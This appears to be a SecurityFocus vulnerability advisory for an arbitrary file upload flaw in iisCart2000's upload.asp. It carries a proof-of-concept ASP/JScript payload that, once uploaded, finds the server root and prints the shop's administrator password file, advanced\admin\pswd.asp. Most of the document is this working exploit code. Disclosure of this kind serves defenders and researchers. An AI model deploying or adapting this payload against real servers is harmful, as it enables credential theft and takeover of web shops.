source: http://www.securityfocus.com/bid/7765/info

A vulnerability has been reported for iisCart2000 that may result in an attacker uploading arbitrary files to a vulnerable server. The vulnerability exists in the upload.asp script. This will allow an attacker to upload arbitrary files to the vulnerable server. Successful exploitation may result in the execution of attacker-supplied code. 

// 1ndonesian Security Team
// http://bosen.net/releases/
//
<% @ Language = JScript %>
<%
function WinPath(absPath) {this.absolutePath = absPath;}
function getAbsPath() {return this.absolutePath;}
WinPath.prototype.getAbsolutePath = getAbsPath;

function fileRead(file) {
  var FSO = new ActiveXObject("Scripting.FileSystemObject"), strOut = ""
  var tmp = file, f, g = FSO.GetFile(tmp);
  f = FSO.OpenTextFile(tmp, 1, false);
  strOut = "<PRE STYLE=\"font-size:9pt;\">";
  strOut+= Server.HTMLEncode(f.ReadAll());
  strOut+= "</PRE>";
  f.Close();
  return(strOut);
}

var a = new WinPath(Server.Mappath("/"));
var curDir   = a.getAbsolutePath();

// You can change these
var admin = curDir + "\\advanced\\admin\\pswd.asp";

with (Response) {
  Write("<b>ServerRoot : "+curDir+"<br></b>");
  Write("<b>Admin Info : "+admin+"<br><br></b>");
  Write(fileRead(admin));
}
%>